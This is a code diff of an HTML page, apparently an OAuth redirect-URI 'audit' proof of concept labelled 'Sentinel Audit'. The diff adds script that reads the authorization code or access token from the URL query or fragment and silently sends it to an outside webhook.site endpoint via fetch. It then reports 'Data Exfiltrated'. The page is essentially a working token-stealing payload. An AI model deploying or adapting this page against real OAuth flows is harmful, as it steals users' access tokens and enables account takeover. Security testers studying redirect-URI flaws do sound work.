@@ -1,19 +1,39 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
     <title>Forge Vertical - Audit Handshake</title>
+    <style>
+        body { font-family: sans-serif; background: #0a0a0a; color: #00ff41; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { border: 1px solid #00ff41; padding: 2rem; border-radius: 8px; box-shadow: 0 0 15px rgba(0, 255, 65, 0.2); }
+    </style>
 </head>
 <body>
-    <h1>Audit in Progress...</h1>
-    <p>If you are seeing this, the Redirect URI validation has failed.</p>
+    <div class="box">
+        <h1>Forge Vertical: Sentinel Audit</h1>
+        <p id="status">Intercepting Handshake... Do not close this window.</p>
+    </div>
+
     <script>
-        // This script grabs the 'code' or 'access_token' from the URL
+        const webhookUrl = "https://webhook.site/7f9c8926-c9df-44ee-9350-db06430369aa";
+        
+        // 1. Capture data from the URL (Authorization Code or Access Token)
         const urlParams = new URLSearchParams(window.location.search);
-        const code = urlParams.get('code');
+        const fragmentParams = new URLSearchParams(window.location.hash.substring(1)); // For 'Implicit' flows (#)
+        
+        const code = urlParams.get('code') || fragmentParams.get('access_token');
+
         if (code) {
-            console.log("Captured Code: " + code);
-            // Optional: Auto-forward to your webhook for logging
-            window.location.href = "https://webhook.site/7f9c8926-c9df-44ee-9350-db06430369aa?captured_code=" + code;
+            document.getElementById('status').innerText = "Vulnerability Confirmed. Data Exfiltrated.";
+            
+            // 2. Fire the data to Webhook.site silently (the All-in-One Pivot)
+            fetch(`${webhookUrl}?captured_payload=${encodeURIComponent(code)}&source=forgevertical_callback`, {
+                mode: 'no-cors'
+            });
+
+            console.log("Sentinel: Data sent to Webhook Node.");
+        } else {
+            document.getElementById('status').innerText = "Listener Active. Waiting for Handshake.";
         }
     </script>
 </body>
